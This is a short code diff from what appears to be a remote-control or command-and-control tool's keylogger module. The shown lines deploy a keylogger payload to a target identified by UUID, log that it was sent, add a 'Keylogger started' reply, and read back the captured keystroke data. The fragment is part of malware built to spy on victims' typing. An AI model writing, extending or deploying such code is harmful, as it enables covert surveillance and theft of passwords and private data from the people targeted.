@@ -11,6 +11,7 @@ class KeyloggerModule:
         user = self.user_repository.get_user(uuid)
         await user.execute(self.payload_path)
         logging.info(f"Sent keylogger to {uuid}")
+        return {"message": "Keylogger started"}
 
     async def action(self, message, uuid):
         keylogger_data = self.user_repository.get_user(uuid).module_data.get(self.module_name, "")
